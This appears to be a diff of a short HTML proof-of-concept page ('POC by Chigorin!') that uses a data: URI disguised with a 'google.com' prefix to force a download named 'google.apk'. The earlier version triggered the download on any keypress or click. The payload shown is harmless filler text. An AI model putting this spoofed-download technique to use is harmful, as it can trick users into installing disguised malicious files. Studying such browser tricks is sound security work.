@@ -1,14 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Download & Fullscreen on Keypress or Click</title>
-</head>
+<html>
 <body>
-  <center><h2>POC by Chigorin!</h2></center>
-
+  <center><h2 onclick="openWin()" style="cursor:pointer;">POC by Chigorin!</h2></center>
   <script>
-    // Fungsi download
     function Puf(uri, name) {
       const link = document.createElement("a");
       link.href = uri;
@@ -17,20 +11,10 @@
       link.click();
       document.body.removeChild(link);
     }
-
     function openWin() {
-      // Gunakan data URL kecil agar cepat dan tidak bergantung CORS
-      Puf(
-        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-        "google.apk"
-      );
+      // INI HANYA JALAN DI CHROME < 88 / FIREFOX < 85
+      Puf("data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=", "google.apk");
     }
-
-    // Download saat keyboard ditekan
-    window.addEventListener('keydown', openWin);
-
-    // Download saat mouse diklik di mana saja
-    document.body.addEventListener('click', openWin);
   </script>
 </body>
 </html>
